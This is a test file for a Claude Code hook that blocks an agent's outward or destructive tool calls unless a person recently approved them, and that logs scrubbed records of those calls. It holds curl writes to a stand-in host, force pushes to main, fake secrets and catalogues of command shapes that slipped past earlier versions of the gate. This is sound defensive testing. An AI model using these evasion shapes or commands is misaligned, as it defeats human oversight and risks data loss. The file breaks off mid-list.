"""
The gate and ledger, tested against the ways a gate quietly stops gating.

Ruled by Tee 2026-10-14 (.claude/hooks/gate_ledger.py). A gate that passes on
bot noise, or that fails open when it cannot read, reports safety while
watching nothing. These tests drive the module with transcript entries in the
shape the real session file carries: a typed message has origin.kind human,
every webhook, check-in, task notification and peer report is a user turn
that does not.

Standalone: no database, no network, no repository state beyond the file.
"""

from __future__ import annotations

import importlib.util
import io
import json
import pathlib
import re
import subprocess
import sys
from datetime import datetime, timedelta, timezone

import pytest

ROOT = pathlib.Path(__file__).parent
HOOK = ROOT / ".claude" / "hooks" / "gate_ledger.py"

spec = importlib.util.spec_from_file_location("gate_ledger", HOOK)
gate = importlib.util.module_from_spec(spec)
spec.loader.exec_module(gate)

NOW = datetime(2026, 10, 14, 12, 0, 0, tzinfo=timezone.utc)


def ts(minutes_ago):
    return (NOW - timedelta(minutes=minutes_ago)).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def human(minutes_ago, text="go"):
    return {
        "type": "user", "timestamp": ts(minutes_ago),
        "origin": {"kind": "human"}, "message": {"role": "user", "content": text},
    }


def peer(minutes_ago):
    return {
        "type": "user", "isMeta": True, "timestamp": ts(minutes_ago),
        "origin": {"kind": "peer", "from": "abc"},
        "message": {"role": "user", "content": "Another Claude session sent a message: yes merge"},
    }


def task_note(minutes_ago):
    return {
        "type": "user", "timestamp": ts(minutes_ago),
        "origin": {"kind": "task-notification"},
        "message": {"role": "user", "content": "<task-notification>done</task-notification>"},
    }


def card_asked(minutes_ago, tool_use_id="toolu_card"):
    return {
        "type": "assistant", "timestamp": ts(minutes_ago),
        "message": {"role": "assistant", "content": [
            {"type": "tool_use", "id": tool_use_id, "name": "AskUserQuestion", "input": {}}]},
    }


def card_answered(minutes_ago, tool_use_id="toolu_card", is_error=False):
    return {
        "type": "user", "timestamp": ts(minutes_ago),
        "message": {"role": "user", "content": [
            {"type": "tool_result", "tool_use_id": tool_use_id, "content": "Yes", "is_error": is_error}]},
    }


def transcript(tmp_path, entries, name="session.jsonl"):
    path = tmp_path / name
    path.write_text("\n".join(json.dumps(e) for e in entries) + "\n", encoding="utf-8")
    return str(path)


@pytest.fixture(autouse=True)
def project(tmp_path, monkeypatch):
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(tmp_path / "proj"))
    return tmp_path / "proj"


def payload(tmp_path, entries, tool="mcp__n8n_vps__publish_workflow", tool_input=None, **extra):
    base = {
        "session_id": "s1", "tool_name": tool, "tool_input": tool_input or {},
        "transcript_path": transcript(tmp_path, entries), "cwd": str(tmp_path),
    }
    base.update(extra)
    return base


def ledger(project):
    path = project / ".claude" / "ledger" / "gate-ledger.jsonl"
    return [json.loads(line) for line in path.read_text().splitlines()] if path.exists() else []


# ---------------------------------------------------------------- classification


@pytest.mark.parametrize("tool", [
    "mcp__n8n__publish_workflow", "mcp__n8n_vps__publish_workflow",
    "mcp__da7c3988-4eb2-4596-b314-2bf80b15710e__publish_workflow",
    "mcp__n8n_vps__execute_workflow", "mcp__n8n__update_workflow",
    "mcp__n8n__archive_workflow", "mcp__n8n__unpublish_workflow",
    "mcp__n8n_vps__restore_workflow_version", "mcp__Railway__set-variables",
    "mcp__github__actions_run_trigger", "mcp__Rakazo__send_message",
    "mcp__Rakazo__update_bot", "mcp__Rakazo__create_bot",
    "mcp__Airtable__update_records_for_table", "mcp__Airtable__delete_records_for_table",
    "mcp__7db057ae-92bb-42b6-8e30-0b15ce0b3565__update_field",
    "mcp__Google_Drive__trash_file", "mcp__Vercel__deploy_to_vercel",
    "mcp__Railway__redeploy", "mcp__Supabase__apply_migration",
    "mcp__Hostinger_Connector__DNS_updateDNSRecordsV1",
    "mcp__Hostinger_Connector__VPS_createNewProjectV1",
    "mcp__025e0b43-72b6-433f-96a6-8e0efdd5e5e6__VPS_deleteProjectV1",
    "mcp__Hostinger_Connector__VPS_createFirewallRuleV1",
])
def test_the_outward_set_from_the_audit_is_gated(tool):
    cls, gated = gate.classify(tool, {})
    assert cls and gated, tool


@pytest.mark.parametrize("tool", [
    "mcp__github__merge_pull_request", "mcp__n8n__test_workflow",
])
def test_merges_and_pin_data_tests_are_ledger_only(tool):
    cls, gated = gate.classify(tool, {})
    assert cls and not gated


@pytest.mark.parametrize("tool", [
    "Read", "Edit", "mcp__github__pull_request_read", "mcp__n8n__get_workflow_details",
    "mcp__Hostinger_Connector__VPS_getVirtualMachinesV1",
    "mcp__claude-code-remote__send_message", "mcp__Claude_Code_Remote__send_message",
    "mcp__Vercel__list_deployments", "mcp__Rakazo__list_bots",
])
def test_reads_and_sibling_session_messages_are_untracked(tool):
    assert gate.classify(tool, {}) == (None, False)


@pytest.mark.parametrize("command,gated", [
    ("git push -u origin claude/audit-gate", False),
    ("git push --force-with-lease origin claude/audit-gate", False),
    ("git push --force-with-lease origin HEAD:claude/audit-gate", False),
    ("git push --force origin claude/audit-gate", True),
    ("git push -f origin claude/audit-gate", True),
    ("git push --force-with-lease origin main", True),
    ("git push origin +main", True),
    ("git push --force-with-lease origin some-other-branch", True),
    ("git push --force-with-lease", True),   # branch unknown in a bare tmp dir
])
def test_force_pushes_are_gated_unless_lease_on_own_branch(command, gated, tmp_path):
    cls, got = gate.classify("Bash", {"command": command}, cwd=str(tmp_path))
    assert cls is not None
    assert got is gated, (command, cls)


def test_plain_push_is_ledgered_not_gated(tmp_path):
    cls, got = gate.classify("Bash", {"command": "git push -u origin claude/x"}, cwd=str(tmp_path))
    assert cls == "git_push" and got is False


def test_a_chained_command_is_read_segment_by_segment(tmp_path):
    cmd = "git add -A && git commit -m x && git push --force origin claude/x"
    cls, gated = gate.classify("Bash", {"command": cmd}, cwd=str(tmp_path))
    assert gated and "git_force_push:plain" in cls


@pytest.mark.parametrize("command,gated", [
    ("curl -s -X POST https://n8n.example.com/webhook/x -d '{}'", True),
    ("curl -s --request DELETE https://api.example.com/x", True),
    ("curl -s -d 'a=1' https://api.example.com/x", True),
    ("curl -s -X POST http://127.0.0.1:8000/api/v1/x -d '{}'", False),
    ("curl -s -X POST http://localhost:3000/x -d '{}'", False),
    ("curl -s https://api.example.com/health", False),
])
def test_curl_is_gated_when_it_writes_to_a_remote_host(command, gated):
    cls, got = gate.classify("Bash", {"command": command})
    assert got is gated, command


def test_container_local_destruction_is_ledgered_not_gated():
    for cmd in ("rm -rf build", "git reset --hard origin/main", "git branch -D old"):
        cls, gated = gate.classify("Bash", {"command": cmd})
        assert cls and not gated, cmd


# ----------------------------------------------------------------- the signal


def test_a_message_from_tee_inside_the_window_passes(tmp_path):
    p = payload(tmp_path, [human(5)])
    allow, reason, sig = gate.decide("x", True, p, NOW)
    assert allow and sig[0] == "message"


def test_a_message_outside_the_window_is_refused(tmp_path):
    p = payload(tmp_path, [human(gate.WINDOW_MIN + 1)])
    allow, reason, _ = gate.decide("x", True, p, NOW)
    assert not allow and "outside" in reason


def test_the_window_edge_is_inclusive(tmp_path):
    p = payload(tmp_path, [human(gate.WINDOW_MIN)])
    assert gate.decide("x", True, p, NOW)[0]


@pytest.mark.parametrize("noise", [peer, task_note])
def test_bot_turns_do_not_open_the_gate(tmp_path, noise):
    """The case the whole design rests on: a peer report that says yes merge,
    and a task notification, both arrive as user turns a minute ago."""
    p = payload(tmp_path, [human(120), noise(1)])
    allow, reason, sig = gate.decide("x", True, p, NOW)
    assert not allow and sig[0] == "message" and sig[1] > 100


def test_a_session_of_only_bot_turns_has_no_signal(tmp_path):
    p = payload(tmp_path, [peer(1), task_note(2)])
    allow, reason, sig = gate.decide("x", True, p, NOW)
    assert not allow and sig is None and "no message" in reason


def test_an_answered_card_counts(tmp_path):
    p = payload(tmp_path, [human(300), card_asked(10), card_answered(9)])
    allow, reason, sig = gate.decide("x", True, p, NOW)
    assert allow and sig[0] == "card"


def test_an_unanswered_card_does_not_count(tmp_path):
    p = payload(tmp_path, [human(300), card_asked(1)])
    assert not gate.decide("x", True, p, NOW)[0]


def test_an_errored_card_result_does_not_count(tmp_path):
    p = payload(tmp_path, [human(300), card_asked(10), card_answered(9, is_error=True)])
    assert not gate.decide("x", True, p, NOW)[0]


def test_a_tool_result_for_another_tool_is_not_a_card(tmp_path):
    p = payload(tmp_path, [human(300), card_answered(1, tool_use_id="toolu_other")])
    assert not gate.decide("x", True, p, NOW)[0]


def test_a_transcript_without_origin_falls_back_to_the_prefix_test(tmp_path):
    old_human = {"type": "user", "timestamp": ts(3), "message": {"content": "merge it"}}
    old_note = {"type": "user", "timestamp": ts(1), "message": {"content": "<task-notification>x"}}
    summary = {"type": "user", "timestamp": ts(1),
               "message": {"content": "This session is being continued from a previous conversation"}}
    p = payload(tmp_path, [old_human, old_note, summary])
    allow, reason, sig = gate.decide("x", True, p, NOW)
    assert allow and sig[1] == pytest.approx(3.0, abs=0.01)


def test_an_interrupt_is_not_an_approval(tmp_path):
    e = {"type": "user", "timestamp": ts(1), "origin": {"kind": "human"},
         "message": {"content": [{"type": "text", "text": "[Request interrupted by user]"}]}}
    p = payload(tmp_path, [e])
    assert not gate.decide("x", True, p, NOW)[0]


def test_a_subagent_hook_reads_the_parent_transcript(tmp_path):
    sess = tmp_path / "abc"
    (sess / "subagents").mkdir(parents=True)
    (tmp_path / "abc.jsonl").write_text(json.dumps(human(2)) + "\n")
    (sess / "subagents" / "agent-1.jsonl").write_text(json.dumps(peer(1)) + "\n")
    p = {"transcript_path": str(sess / "subagents" / "agent-1.jsonl")}
    assert gate.decide("x", True, p, NOW)[0]


def test_the_gate_fails_closed_without_a_path(tmp_path):
    allow, reason, _ = gate.decide("x", True, {}, NOW)
    assert not allow and "no transcript_path" in reason


def test_the_gate_fails_closed_on_an_unreadable_transcript(tmp_path):
    allow, reason, _ = gate.decide("x", True, {"transcript_path": str(tmp_path / "nope.jsonl")}, NOW)
    assert not allow and "could not be read" in reason


def test_a_corrupt_line_is_skipped_not_fatal(tmp_path):
    path = tmp_path / "t.jsonl"
    path.write_text("{not json\n" + json.dumps(human(2)) + "\n")
    assert gate.decide("x", True, {"transcript_path": str(path)}, NOW)[0]


def test_an_ungated_call_never_reads_the_transcript():
    assert gate.decide("x", False, {}, NOW)[0]


# ------------------------------------------------------- the real transcript


REAL = pathlib.Path("/root/.claude/projects/-home-user-Meta-Supreme-Apex-Genesis-")


def _real_transcripts_readable():
    """False on a machine with no such directory and on one where it exists
    and cannot be read (a CI runner is neither root nor this container)."""
    try:
        return REAL.is_dir() and any(REAL.glob("*.jsonl"))
    except OSError:
        return False


@pytest.mark.skipif(not _real_transcripts_readable(), reason="no readable Claude Code transcript here")
def test_the_real_transcript_shape_is_read_by_the_gate():
    """Pins the discriminator against a file the product wrote, not against the
    fixtures above. Skipped where there is none, and it asserts only shape."""
    files = sorted(REAL.glob("*.jsonl"), key=lambda p: p.stat().st_mtime)
    assert files
    checked = 0
    for path in files[-3:]:
        far_future = datetime(2100, 1, 1, tzinfo=timezone.utc)
        sig = gate.latest_signal(str(path), far_future)
        if sig is not None:
            assert sig[0] in ("message", "card") and sig[1] > 0
            checked += 1
    mains = [p for p in files if "subagents" not in str(p)]
    if any('"origin": {"kind": "human"}' in p.read_text(errors="replace") for p in mains):
        assert checked >= 1, "a real transcript holds a typed message and the gate found none"


# ------------------------------------------------------------------ run + ledger


def test_pre_denies_a_gated_call_and_writes_the_decision(tmp_path, project):
    p = payload(tmp_path, [human(200)])
    out = gate.run("pre", p, now=NOW)
    spec_ = out["hookSpecificOutput"]
    assert spec_["permissionDecision"] == "deny"
    assert "AskUserQuestion" in spec_["permissionDecisionReason"]
    rows = ledger(project)
    assert [r["event"] for r in rows] == ["gate-deny"] and rows[0]["gated"] is True


def test_pre_allows_a_gated_call_with_a_fresh_message(tmp_path, project):
    out = gate.run("pre", payload(tmp_path, [human(1)]), now=NOW)
    assert out is None
    assert [r["event"] for r in ledger(project)] == ["gate-allow"]


def test_pre_ignores_an_untracked_call_and_writes_nothing(tmp_path, project):
    out = gate.run("pre", payload(tmp_path, [], tool="Read"), now=NOW)
    assert out is None and ledger(project) == []


def test_a_merge_is_ledgered_and_never_refused(tmp_path, project):
    p = payload(tmp_path, [human(900)], tool="mcp__github__merge_pull_request",
                tool_input={"pullNumber": 7})
    assert gate.run("pre", p, now=NOW) is None
    assert gate.run("post", p, now=NOW) is None
    assert [r["event"] for r in ledger(project)] == ["gate-allow", "executed"]


def test_post_and_fail_record_the_outcome(tmp_path, project):
    p = payload(tmp_path, [human(1)])
    gate.run("post", p, now=NOW)
    gate.run("fail", dict(p, error="HTTP 402"), now=NOW)
    rows = ledger(project)
    assert [r["event"] for r in rows] == ["executed", "failed"]
    assert rows[1]["error"] == "HTTP 402"
    assert rows[0]["tool"] == "mcp__n8n_vps__publish_workflow"


def test_the_ledger_never_stores_a_token(tmp_path, project):
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIzOWJjMTgxMCJ9.abcdefghijklmnop1234"
    hexkey = "9f" * 32
    cmd = ("curl -s -X POST https://n8n.example.com/x -H 'Authorization: Bearer %s' "
           "-d '{\"k\":\"%s\"}' 'https://x.example.com/mcp?key=forge-9f2k7m4x'") % (jwt, hexkey)
    p = payload(tmp_path, [human(1)], tool="Bash", tool_input={"command": cmd})
    gate.run("post", p, now=NOW)
    stored = json.dumps(ledger(project))
    assert jwt not in stored and hexkey not in stored and "forge-9f2k7m4x" not in stored
    assert "[REDACTED]" in stored
    assert "n8n.example.com" in stored


def test_scrub_leaves_ordinary_text_alone():
    text = "git push --force-with-lease origin claude/audit-gate-and-paste-loop"
    assert gate.scrub(text) == text


def test_main_prints_the_deny_json_and_exits_zero(tmp_path, monkeypatch, capsys):
    p = payload(tmp_path, [human(500)])
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(p)))
    assert gate.main(["gate_ledger.py", "pre"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_main_fails_closed_when_the_decision_code_raises(tmp_path, monkeypatch, capsys):
    p = payload(tmp_path, [human(1)])
    monkeypatch.setattr(gate, "decide", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(p)))
    gate.main(["gate_ledger.py", "pre"])
    out = json.loads(capsys.readouterr().out)
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "failed closed" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_main_does_not_deny_an_untracked_call_when_the_code_raises(tmp_path, monkeypatch, capsys):
    p = payload(tmp_path, [human(1)], tool="Read")
    monkeypatch.setattr(gate, "run", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(p)))
    gate.main(["gate_ledger.py", "pre"])
    assert capsys.readouterr().out == ""


def test_garbage_stdin_does_not_crash(monkeypatch, capsys):
    monkeypatch.setattr(sys, "stdin", io.StringIO("not json"))
    assert gate.main(["gate_ledger.py", "pre"]) == 0
    assert capsys.readouterr().out == ""


def test_the_script_runs_as_a_process(tmp_path):
    """The path the harness takes: stdin in, JSON out, exit zero."""
    p = payload(tmp_path, [human(900)])
    proc = subprocess.run(
        [sys.executable, str(HOOK), "pre"], input=json.dumps(p), capture_output=True,
        text=True, env={"CLAUDE_PROJECT_DIR": str(tmp_path / "proj"), "PATH": "/usr/bin:/bin"},
    )
    assert proc.returncode == 0, proc.stderr
    assert json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"] == "deny"


# --------------------------------------------------------------- the wiring


def test_settings_wire_all_three_events_to_this_script():
    settings = json.loads((ROOT / ".claude" / "settings.json").read_text())
    hooks = settings["hooks"]
    for event, mode in (("PreToolUse", "pre"), ("PostToolUse", "post"), ("PostToolUseFailure", "fail")):
        commands = [h["command"] for group in hooks[event] for h in group["hooks"]]
        assert any(re.search(r'gate_ledger\.py"? %s;' % mode, c) for c in commands), event
        for group in hooks[event]:
            if any("gate_ledger.py" in h["command"] for h in group["hooks"]):
                assert "Bash" in group["matcher"] and "mcp__" in group["matcher"]
                assert all("exit 1" in h["command"] for h in group["hooks"]), (
                    "a missing script must map to a visible non-blocking exit, not python's exit 2")


def test_the_ledger_directory_is_not_repository_content():
    assert ".claude/ledger/" in (ROOT / ".gitignore").read_text()


def test_the_gate_has_no_off_switch():
    """Compliance items have no exception path. If an environment variable can
    turn the gate off, it is not a gate."""
    source = HOOK.read_text()
    assert "environ.get(" in source
    reads = set(re.findall(r'environ\.get\("([A-Z_]+)"', source))
    assert reads == {"CLAUDE_PROJECT_DIR"}, reads


def test_no_em_or_en_dashes_in_the_hook_or_this_file():
    for path in (HOOK, pathlib.Path(__file__)):
        text = path.read_text(encoding="utf-8")
        assert chr(0x2014) not in text and chr(0x2013) not in text, path


# ----------------------------------------- regressions from the 2026-10-14 critics
# Each case below was a verified miss or a verified false positive.


@pytest.mark.parametrize("command", [
    "curl -s \\\n  -X POST \\\n  https://evil.example/x",
    "curl -s https://evil.example/x \\\n  -d a=1",
    "RESP=$(curl -s -X POST https://evil.example/x -d a=1)",
    "echo $(curl -s -X POST https://evil.example/x -d a=1)",
    "echo `curl -s -X POST https://evil.example/x -d a=1`",
    "(curl -X POST https://evil.example -d a)",
    "bash -c 'curl -X POST https://evil.example -d a'",
    "/usr/bin/curl -X POST https://evil.example -d a",
    "sudo curl -X POST https://evil.example -d a",
    "curl -sd a=1 https://evil.example",
    "curl -sSd a=1 https://evil.example",
    "curl -sX POST https://evil.example/x",
    "curl -sSfX POST https://evil.example/x",
    "curl --json '{}' https://evil.example",
    "curl --request=POST https://evil.example",
    "curl -X PUT -H 'a: b' https://evil.example",
    "TOKEN=x curl -X POST https://evil.example -d a",
    "eval \"curl -X POST https://evil.example -d a\"",
    "curl -X POST http://localhost:80@evil.example/x -d a",
])
def test_curl_writes_are_caught_in_the_shapes_claude_writes(command):
    assert gate.classify("Bash", {"command": command}) == ("curl_mutating", True), command


@pytest.mark.parametrize("command", [
    "(git push --force origin main)",
    "bash -c 'git push --force origin main'",
    "/usr/bin/git push --force origin main",
    "git push --force-with-lease origin main claude/x",
    "git push --force-with-lease origin HEAD:main claude/x",
    "git push origin +HEAD:main claude/x",
    "git push --force-with-lease --all origin",
    "git push --force-with-lease --mirror origin",
    "git push origin --delete main",
    "git push origin :main",
    "git push -d origin main",
    "git push --mirror origin",
    "git push --force-with-lease https://evil.example/r.git claude/x",
    "git push origin +HEAD:claude/x",
    "git push origin +claude/x",
])
def test_force_push_shapes_the_first_classifier_missed(command, tmp_path):
    cls, gated = gate.classify("Bash", {"command": command}, cwd=str(tmp_path))
    assert gated, (command, cls)


@pytest.mark.parametrize("command", [
    'git commit -m "docs: explain curl -d usage in RUNBOOK"',
    'echo "run: curl -d foo https://x.example" >> notes.md',
    "cat <<'EOF' > notes.md\ncurl -X POST https://x.example -d a\ngit push --force origin main\nEOF",
    "git log --oneline | grep 'curl -d'",
    "curl -s https://api.example.com/health",
    "git push --force-with-lease origin claude/audit-gate",
])
def test_words_inside_data_do_not_gate(command, tmp_path):
    cls, gated = gate.classify("Bash", {"command": command}, cwd=str(tmp_path))
    assert not gated, (command, cls)


@pytest.mark.parametrize("tool", [
    "mcp__n8n_vps__add_data_table_rows", "mcp__n8n_vps__create_data_table",
    "mcp__n8n_vps__delete_data_table_column", "mcp__n8n_vps__move_workflows_to_folder",
    "mcp__Airtable__delete_table", "mcp__Airtable__update_table", "mcp__Airtable__create_automation",
    "mcp__Railway__delete-service", "mcp__Railway__update-service", "mcp__Railway__deploy-template",
    "mcp__Vercel__add_project_domain", "mcp__Vercel__create_project_env",
    "mcp__Vercel__request_promote", "mcp__Vercel__request_rollback",
    "mcp__Supabase__deploy_edge_function", "mcp__Supabase__merge_branch",
    "mcp__Hostinger_Connector__DNS_resetDNSRecordsV1", "mcp__Hostinger_Connector__DNS_deleteDNSRecordsV1",
    "mcp__Hostinger_Connector__domains_purchaseNewDomainV1",
    "mcp__Blotato__blotato_create_post", "mcp__Docusign__createEnvelope",
    "mcp__Zapier__execute_zapier_write_action",
    "mcp__claude_ai_Rakazo__send_message", "mcp__plugin_x_Rakazo__send_message",
])
def test_sibling_write_tools_of_the_named_platforms_are_gated(tool):
    cls, gated = gate.classify(tool, {})
    assert cls and gated, tool


@pytest.mark.parametrize("tool", [
    "mcp__n8n_vps__get_workflow_details", "mcp__n8n_vps__search_workflows",
    "mcp__n8n_vps__validate_workflow", "mcp__n8n_vps__prepare_workflow_pin_data",
    "mcp__Airtable__list_records_for_table", "mcp__Airtable__search_records",
    "mcp__Railway__list-services", "mcp__Railway__get-logs", "mcp__Railway__fetch-docs",
    "mcp__Vercel__get_deployment", "mcp__Vercel__list_deployments",
    "mcp__Supabase__list_tables", "mcp__Zapier__list_zapier_connections",
    "mcp__Google_Drive__create_file", "mcp__Google_Drive__update_file",
    "mcp__github__create_pull_request", "mcp__github__add_issue_comment",
])
def test_reads_and_ordinary_pr_and_drive_work_stay_untracked(tool):
    assert gate.classify(tool, {}) == (None, False), tool


def test_a_message_with_an_attached_image_is_a_signal(tmp_path):
    entry = {"type": "user", "timestamp": ts(1), "origin": {"kind": "human"},
             "message": {"content": [{"type": "text", "text": "ship this screenshot's fix"},
                                      {"type": "image", "source": {}}]}}
    assert gate.decide("x", True, payload(tmp_path, [entry]), NOW)[0]
    only_image = dict(entry, message={"content": [{"type": "image", "source": {}}]})
    assert gate.decide("x", True, payload(tmp_path, [only_image]), NOW)[0]


def test_a_tool_result_list_is_never_a_message(tmp_path):
    entry = {"type": "user", "timestamp": ts(1), "origin": {"kind": "human"},
             "message": {"content": [{"type": "tool_result", "tool_use_id": "t", "content": "yes"}]}}
    assert not gate.decide("x", True, payload(tmp_path, [entry]), NOW)[0]


def test_a_future_timestamp_does_not_open_the_gate_forever(tmp_path):
    skewed = human(-600)   # ten hours ahead of NOW
    assert not gate.decide("x", True, payload(tmp_path, [skewed]), NOW)[0]
    near = human(-2)       # two minutes ahead is ordinary skew
    assert gate.decide("x", True, payload(tmp_path, [near]), NOW)[0]


def test_one_bad_byte_does_not_blind_the_gate(tmp_path):
    path = tmp_path / "t.jsonl"
    path.write_bytes((json.dumps(human(2)) + "\n").encode() + b"\xff\xfe bad bytes\n")
    assert gate.decide("x", True, {"transcript_path": str(path)}, NOW)[0]


def test_a_workflow_nested_subagent_reads_the_session_file(tmp_path):
    sess = tmp_path / "abc"
    nested = sess / "subagents" / "workflows" / "wf_1"
    nested.mkdir(parents=True)
    (tmp_path / "abc.jsonl").write_text(json.dumps(human(2)) + "\n")
    (nested / "agent-1.jsonl").write_text(json.dumps(peer(1)) + "\n")
    assert gate.decide("x", True, {"transcript_path": str(nested / "agent-1.jsonl")}, NOW)[0]


def test_an_unwritable_ledger_never_changes_the_decision(tmp_path, project, capsys):
    (project / ".claude").mkdir(parents=True)
    (project / ".claude" / "ledger").write_text("a file where the directory should be")
    assert gate.run("pre", payload(tmp_path, [human(1)]), now=NOW) is None
    out = gate.run("pre", payload(tmp_path, [human(500)]), now=NOW)
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "ledger write failed" in capsys.readouterr().err


def test_the_deny_reason_covers_a_session_with_no_one_in_it(tmp_path):
    out = gate.run("pre", payload(tmp_path, [task_note(1)]), now=NOW)
    reason = out["hookSpecificOutput"]["permissionDecisionReason"]
    assert "no one is present" in reason and "AskUserQuestion" in reason


def test_lowercase_bash_is_still_classified():
    assert gate.classify("bash", {"command": "curl -X POST https://x.example -d a"})[1] is True


@pytest.mark.parametrize("secret", [
    "SMTP_PASS=hunter2hunter2", "STRIPE_SECRET=sk_live_abcdefghijklmnop", "OPENAI_API_KEY=abcdefgh12345678",
    "DATABASE_PASSWORD=correcthorsebattery", "client_secret=abcd1234efgh5678",
    "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "AKIAIOSFODNN7EXAMPLE", "https://deploy:s3cr3tPassw0rd@github.com/org/repo.git",
    "curl -u admin:SuperSecret123 https://x.example",
])
def test_scrub_catches_the_shapes_the_first_version_missed(secret):
    cleaned = gate.scrub(secret)
    for fragment in ("hunter2hunter2", "abcdefghijklmnop", "abcdefgh12345678", "correcthorsebattery",
                     "abcd1234efgh5678", "wJalrXUtnFEMI", "IOSFODNN7EXAMPLE", "s3cr3tPassw0rd", "SuperSecret123"):
        assert fragment not in cleaned, (secret, cleaned)


def test_scrub_keeps_the_evidence_a_ledger_exists_for():
    keep = [
        "git push --force origin claude/feature-branch-name-with-long-slug-2026-10-14",
        "git checkout 3f786850e387550fdab836ed7e6dc881de23001b",
        "pytest test_devon_provider_billing.py::test_the_long_named_case_for_billing_honesty",
    ]
    for text in keep:
        assert gate.scrub(text) == text, text


def test_the_ledger_leads_with_the_identifying_fields(tmp_path, project):
    tool_input = {"operations": [{"type": "updateNodeParameters", "nodeName": "x" * 400}],
                  "workflowId": "Vf7sD2kLpQ9rT3xN"}
    assert "Vf7sD2kLpQ9rT3xN" in gate.summarize("mcp__n8n_vps__update_workflow", tool_input)


def test_scrub_is_linear_on_adversarial_input():
    import time
    for blob in ("a" * 200_000 + "!", "0" * 200_000, "key=" + "x" * 200_000, "Aa1" * 70_000):
        start = time.time()
        gate.scrub(blob)
        assert time.time() - start < 5, blob[:12]


# ----------------------------------------- regressions from the second critic round


@pytest.mark.parametrize("command", [
    "for id in 1 2 3; do curl -X POST https://n8n.example.com/webhook/$id; done",
    "if [ -f x ]; then git push --force origin main; fi",
    "while read l; do curl -d $l https://x.example.com; done < f",
    "f() { curl -d a=1 https://x.example.com; }; f",
    "! curl -d a=1 https://x.example.com",
    "# don't force\ngit push --force origin main",
    "# check the repo's state\ncurl -X POST https://api.example.com/x",
    "echo a # it's\ngit push -f origin main",
    "timeout 10 curl -X POST https://x.example.com",
    "sudo -n git push -f origin main",
    "sudo -u deploy curl -d a=1 https://x.example.com",
    "env -i curl -d a=1 https://x.example.com",
    "nice -n 5 curl -d a=1 https://x.example.com",
    "command -p curl -d a=1 https://x.example.com",
    "echo x | xargs curl -X POST https://x.example.com",
    "find . -exec curl -d @{} https://x.example.com \\;",
])
def test_the_one_line_loop_comment_and_wrapper_shapes_are_caught(command, tmp_path):
    cls, gated = gate.classify("Bash", {"command": command}, cwd=str(tmp_path))
    assert gated, (command, cls)


@pytest.mark.parametrize("command", [
    "git push --force-with-lease origin claude/x 2>&1",
    "git push --force-with-lease origin claude/x 2>&1 | tail -3",
    "git push --force-with-lease origin claude/x > /tmp/o",
    "git push --force-with-lease origin claude/x 2>/dev/null",
    "git push --force-with-lease origin claude/x >/dev/null 2>&1",
    "git push --force-with-lease origin claude/x; echo rc=$?",
    "curl -d a=1 127.0.0.1:8000/x",
    "curl -X POST localhost:8000/api",
    "curl -G --data-urlencode q=x https://api.example.com/s",
    "cat <<< word\ncurl -s https://api.example.com/health",
])
def test_ordinary_work_the_first_fix_would_have_refused(command, tmp_path):
    cls, gated = gate.classify("Bash", {"command": command}, cwd=str(tmp_path))
    assert not gated, (command, cls)


def test_a_here_string_does_not_swallow_the_next_line(tmp_path):
    cls, gated = gate.classify("Bash", {"command": "cat <<< word\ngit push -f origin main"}, cwd=str(tmp_path))
    assert gated


@pytest.mark.parametrize("tool", [
    "mcp__Vercel__complete_rolling_release", "mcp__Vercel__replace_domain_dns_records",
    "mcp__Vercel__approve_rolling_release_stage", "mcp__Vercel__issue_cert",
    "mcp__Vercel__edit_project_env", "mcp__Vercel__edit_route", "mcp__Vercel__rerequest_check",
    "mcp__Vercel__test_drain", "mcp__Railway__generate-domain",
    "mcp__Airtable__revert_action", "mcp__Airtable__test_automation_webhook_trigger",
    "mcp__Zapier__manage_zapier_connections", "mcp__Zapier__auto_provision_mcp",
    "mcp__Rakazo__finish_model_signin",
    "mcp__plugin_hostinger_hostinger__hosting_deployJsApplication",
    "mcp__abcd-uuid__hosting_importWordpressWebsite",
    "mcp__abcd-uuid__domains_updateNameserversV1",
])
def test_a_write_verb_nobody_listed_is_still_gated_on_a_named_server(tool):
    cls, gated = gate.classify(tool, {})
    assert cls and gated, tool


@pytest.mark.parametrize("tool", [
    "mcp__Vercel__aggregate_events", "mcp__Vercel__count_pageviews", "mcp__Vercel__artifact_query",
    "mcp__Vercel__create_observability_query", "mcp__Vercel__search_vercel_documentation",
    "mcp__Railway__domain-status", "mcp__Railway__http-requests", "mcp__Railway__environment-status",
    "mcp__Zapier__execute_zapier_read_action", "mcp__Zapier__discover_zapier_actions",
    "mcp__Docusign__getEnvelope", "mcp__Docusign__listRecipients", "mcp__Docusign__resolveEnvelopeSendMethod",
    "mcp__Blotato__blotato_list_posts", "mcp__Blotato__blotato_get_post_status",
    "mcp__Supabase__generate_typescript_types", "mcp__Supabase__query_logs",
    "mcp__Rakazo__read_thread", "mcp__Rakazo__thread_status",
    "mcp__Hostinger_Connector__VPS_getVirtualMachinesV1", "mcp__Hostinger_Connector__DNS_getDNSRecordsV1",
    "mcp__n8n_vps__explore_node_resources", "mcp__Airtable__analyze_table",
])
def test_reads_on_a_named_server_pass_without_a_signal(tool):
    assert gate.classify(tool, {}) == (None, False), tool


def test_one_huge_token_does_not_blow_the_hook_timeout():
    import time
    start = time.time()
    gate.classify("Bash", {"command": "echo " + "a" * 500_000})
    gate.classify("Bash", {"command": "echo 'x " + "word " * 100_000})
    assert time.time() - start < 3


# ----------------------------------------------- gh and wget, ruled 2026-10-14


@pytest.mark.parametrize("command,cls", [
    ("gh workflow run ci.yml", "gh_workflow_run"),
    ("gh workflow run ci.yml -f env=prod", "gh_workflow_run"),
    ("gh api -X POST repos/o/r/dispatches", "gh_api_write"),
    ("gh api --method DELETE repos/o/r/git/refs/heads/x", "gh_api_write"),
